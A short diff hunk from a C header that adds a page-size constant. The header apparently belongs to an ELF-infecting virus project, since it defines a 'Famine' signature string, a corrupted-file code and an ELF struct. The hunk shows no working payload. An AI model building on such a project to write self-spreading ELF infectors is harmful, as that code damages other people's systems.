@@ -15,6 +15,9 @@
 # include <unistd.h>
 
 # define SIGNATURE "Famine version 1.0 (c)oded by lmartin"
+
+# define PAGE_SIZE 0x1000
+
 # define CORRUPTED_FILE -1
 
 typedef struct		s_elf
